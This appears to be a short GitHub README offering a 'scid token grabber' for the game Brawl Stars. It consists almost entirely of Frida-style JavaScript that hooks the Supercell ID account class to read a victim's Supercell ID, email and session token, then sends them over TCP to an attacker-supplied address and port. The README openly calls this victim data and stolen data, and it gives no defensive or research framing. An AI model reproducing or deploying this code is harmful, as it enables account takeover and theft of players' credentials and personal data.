# Brawl-Stars-ScidToken
Just an easy scid token grabber for brawl stars that sent data to a TCP
 over TCP

 #This part of the code retrieves victim account data :
 ```js

var IdAccount = Java.use("com.supercell.id.scid_plugin.IdAccount");

IdAccount.toString.overload().implementation = function () {
    var result = this.toString();
    
    var supercellId = this.supercellId.value;  // Retrieves the Supercell ID
    var email = this.email.value;             // Retrieves the associated email
    var scidToken = this.scidToken.value;     // Retrieves the SCID token

    console.log(supercellId);
    console.log(email);
    console.log(scidToken);

    sendToTcpServer(supercellId, email, scidToken); // Sends data to the remote server

    return result;
};
```
# This part manages the connection to the remote server:

```js

function sendToTcpServer(supercellId, email, scidToken) {
    var Socket = Java.use("java.net.Socket");
    var InetAddress = Java.use("java.net.InetAddress");
    var OutputStream = Java.use("java.io.OutputStream");
    var BufferedWriter = Java.use("java.io.BufferedWriter");
    var OutputStreamWriter = Java.use("java.io.OutputStreamWriter");

    var serverAddress = "YOUR ADDRESS"; // Remote server address
    var serverPort = YOUR PORT;         // Remote server port

    // Creating a TCP connection
    var socket = Socket.$new(serverAddress, serverPort);
    var outputStream = socket.getOutputStream();
    var writer = BufferedWriter.$new(OutputStreamWriter.$new(outputStream, "UTF-8"));

    // Creating the message with stolen data
    var message = "Supercell ID: " + supercellId + "\nEmail: " + email + "\nToken: " + scidToken;

    // Sending data to the remote server
    writer.write(message);
    writer.flush();
    writer.close();
    outputStream.close();
    socket.close();

    console.log("Data sent to TCP server");
}
```
